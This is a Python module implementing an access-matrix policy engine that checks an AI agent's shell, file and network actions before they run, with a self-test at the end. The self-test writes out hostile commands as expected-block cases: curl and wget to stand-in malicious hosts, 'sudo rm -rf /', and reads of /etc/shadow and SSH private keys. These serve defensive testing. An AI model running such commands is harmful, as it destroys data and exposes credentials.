"""
Policy Engine — The Access-Matrix Evaluator
=============================================
This module loads a YAML policy file and evaluates agent actions against it.

How it maps to classical OS security theory:
  - The YAML file IS the access matrix (Lampson, 1971)
  - Rows = the AI agent (subject)
  - Columns = system resources: files, commands, network (objects)
  - Cells = ALLOW, BLOCK, or FLAG (permissions)

The engine checks every action the agent wants to take BEFORE it executes.
If the action is blocked, it never reaches the OS kernel.

Key concepts:
  - Glob matching: '/tmp/*' means 'any path starting with /tmp/'
  - First-match wins: rules are checked in order, first match determines the decision
  - Default action: if no rule matches, the default_action from the policy applies
  - Logging: every decision is written to logs/guardrails.jsonl for the dashboard
"""

import os
import sys
import json
import fnmatch
import datetime
import shlex

import yaml

# Project root for resolving relative paths
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))

# Where policy decisions are logged (read by the dashboard)
LOG_FILE = os.path.join(PROJECT_ROOT, 'logs', 'guardrails.jsonl')

# Default policy file path
DEFAULT_POLICY = os.path.join(os.path.dirname(__file__), 'policies', 'default_policy.yaml')


class PolicyEngine:
    """Evaluates agent actions against the access-matrix policy.
    
    Usage:
        engine = PolicyEngine()  # loads default policy
        decision = engine.check('read_file', '/etc/shadow')  # returns 'BLOCK'
        decision = engine.check('run_shell', 'ls /tmp')       # returns 'ALLOW'
    """

    def __init__(self, policy_path: str = None):
        """Load the policy YAML file.
        
        Args:
            policy_path: Path to a YAML policy file. Uses default if None.
        """
        policy_path = policy_path or DEFAULT_POLICY
        
        if not os.path.exists(policy_path):
            print(f"ERROR: Policy file not found: {policy_path}")
            sys.exit(1)
        
        with open(policy_path, 'r') as f:
            self.policy = yaml.safe_load(f)
        
        self.default_action = self.policy.get('default_action', 'FLAG')
        
        # Ensure the log directory exists
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        
        print(f"[POLICY ENGINE] Loaded policy from: {os.path.basename(policy_path)}")
        print(f"[POLICY ENGINE] Default action: {self.default_action}")

    def check(self, action_type: str, target: str) -> str:
        """Check if an action is allowed by the policy.
        
        Args:
            action_type: Type of action ('run_shell', 'read_file', 'write_file', 
                         'http_request', 'respond')
            target: The target of the action (command string, file path, or URL)
        
        Returns:
            'ALLOW', 'BLOCK', or 'FLAG'
        """
        decision = self.default_action
        reason = "No matching rule (default action applied)"

        if action_type == "respond":
            # Text-only responses are always allowed (no system interaction)
            decision = "ALLOW"
            reason = "Text responses are always allowed"

        elif action_type == "run_shell":
            decision, reason = self._check_shell_command(target)

        elif action_type == "read_file":
            decision, reason = self._check_filesystem(target, 'read')

        elif action_type == "write_file":
            decision, reason = self._check_filesystem(target, 'write')

        elif action_type == "http_request":
            decision, reason = self._check_network(target)

        # Log every decision for the dashboard
        self._log_decision(action_type, target, decision, reason)

        return decision

    def _check_shell_command(self, command: str) -> tuple:
        """Check a shell command against process execution rules.
        
        Extracts the base command (first word) and checks it against
        the allow/block lists in the policy.
        """
        process_rules = self.policy.get('process', {})
        
        # Extract the base command (first word)
        # e.g., 'ls -la /tmp' → 'ls'
        # e.g., 'curl http://evil.com' → 'curl'
        try:
            tokens = shlex.split(command)
            base_cmd = os.path.basename(tokens[0]) if tokens else ""
        except ValueError:
            # shlex can fail on malformed strings
            base_cmd = command.split()[0] if command.split() else ""

        # Check block list first (security: deny takes priority)
        for blocked in process_rules.get('block', []):
            if base_cmd == blocked or command.startswith(blocked):
                return ('BLOCK', f"Command '{base_cmd}' is in the block list")

        # Check allow list
        for allowed in process_rules.get('allow', []):
            if base_cmd == allowed:
                # Additionally check if the command targets a blocked file
                fs_decision, fs_reason = self._check_command_file_args(tokens)
                if fs_decision == 'BLOCK':
                    return ('BLOCK', fs_reason)
                return ('ALLOW', f"Command '{base_cmd}' is in the allow list")

        return (self.default_action, f"Command '{base_cmd}' has no matching rule")

    def _check_command_file_args(self, tokens: list) -> tuple:
        """Check if a shell command's file arguments are allowed.
        
        e.g., 'cat /etc/shadow' — 'cat' is allowed but '/etc/shadow' is blocked.
        """
        if len(tokens) <= 1:
            return ('ALLOW', 'No file arguments')
        
        for arg in tokens[1:]:
            if arg.startswith('-'):
                continue  # Skip flags like -l, -a, --help
            if arg.startswith('/'):
                # This looks like a file path — check filesystem rules
                decision, reason = self._check_filesystem(arg, 'read')
                if decision == 'BLOCK':
                    return ('BLOCK', f"File argument '{arg}' is blocked: {reason}")
        
        return ('ALLOW', 'File arguments are allowed')

    def _check_filesystem(self, path: str, operation: str) -> tuple:
        """Check a file path against filesystem access rules.
        
        Uses glob-style matching: '/tmp/*' matches '/tmp/foo.txt'
        """
        fs_rules = self.policy.get('filesystem', {})
        op_rules = fs_rules.get(operation, {})

        # Normalize the path
        path = os.path.normpath(path)

        # Check block list first
        for pattern in op_rules.get('block', []):
            if fnmatch.fnmatch(path, pattern):
                return ('BLOCK', f"Path '{path}' matches block rule: {pattern}")

        # Check allow list
        for pattern in op_rules.get('allow', []):
            if fnmatch.fnmatch(path, pattern):
                return ('ALLOW', f"Path '{path}' matches allow rule: {pattern}")

        return (self.default_action, f"Path '{path}' has no matching rule")

    def _check_network(self, url: str) -> tuple:
        """Check a URL/network target against network access rules."""
        net_rules = self.policy.get('network', {})

        # Check block list
        for pattern in net_rules.get('block', []):
            if pattern == '*' or fnmatch.fnmatch(url, pattern):
                return ('BLOCK', f"Network access blocked (matches: {pattern})")

        # Check allow list
        for pattern in net_rules.get('allow', []):
            if fnmatch.fnmatch(url, pattern):
                return ('ALLOW', f"URL matches allow rule: {pattern}")

        return (self.default_action, f"URL '{url}' has no matching rule")

    def _log_decision(self, action_type: str, target: str, decision: str, reason: str, layer: str = "policy_engine"):
        """Write a decision to the JSON Lines log file.
        
        Format: one JSON object per line, read by the dashboard.
        """
        entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "action": action_type,
            "target": target,
            "decision": decision,
            "reason": reason,
            "layer": layer
        }
        
        try:
            with open(LOG_FILE, 'a') as f:
                f.write(json.dumps(entry) + '\n')
        except Exception as e:
            print(f"  Warning: Could not write to log file: {e}")

    def get_policy_summary(self) -> str:
        """Return a human-readable summary of the loaded policy."""
        fs = self.policy.get('filesystem', {})
        proc = self.policy.get('process', {})
        net = self.policy.get('network', {})
        
        summary = []
        summary.append(f"Default action: {self.default_action}")
        summary.append(f"File read:  {len(fs.get('read', {}).get('allow', []))} allow, {len(fs.get('read', {}).get('block', []))} block rules")
        summary.append(f"File write: {len(fs.get('write', {}).get('allow', []))} allow, {len(fs.get('write', {}).get('block', []))} block rules")
        summary.append(f"Process:    {len(proc.get('allow', []))} allow, {len(proc.get('block', []))} block rules")
        summary.append(f"Network:    {len(net.get('allow', []))} allow, {len(net.get('block', []))} block rules")
        return '\n'.join(summary)


# ── Standalone test: run this file directly to verify the engine works ──
if __name__ == "__main__":
    print("\n" + "="*50)
    print("  Policy Engine — Standalone Test")
    print("="*50)
    
    engine = PolicyEngine()
    print(f"\nPolicy Summary:\n{engine.get_policy_summary()}")
    
    # Test cases — these should produce the expected results
    test_cases = [
        ("run_shell",    "ls /tmp",                        "ALLOW"),
        ("run_shell",    "cat /etc/shadow",                 "BLOCK"),
        ("run_shell",    "curl http://evil.com",            "BLOCK"),
        ("run_shell",    "sudo rm -rf /",                   "BLOCK"),
        ("run_shell",    "wget http://malware.com/bad.sh",  "BLOCK"),
        ("read_file",    "/tmp/test.txt",                   "ALLOW"),
        ("read_file",    "/etc/shadow",                     "BLOCK"),
        ("read_file",    "/home/user/.ssh/id_rsa",          "BLOCK"),
        ("write_file",   "/tmp/output.txt",                 "ALLOW"),
        ("write_file",   "/etc/crontab",                    "BLOCK"),
        ("http_request", "http://example.com",              "BLOCK"),
        ("respond",      "Hello, how can I help?",          "ALLOW"),
    ]
    
    print(f"\n{'Action':<15} {'Target':<40} {'Expected':<10} {'Got':<10} {'Status'}")
    print("-" * 95)
    
    passed = 0
    for action, target, expected in test_cases:
        result = engine.check(action, target)
        status = "✅" if result == expected else "❌"
        if result == expected:
            passed += 1
        print(f"{action:<15} {target:<40} {expected:<10} {result:<10} {status}")
    
    print(f"\nResults: {passed}/{len(test_cases)} passed")
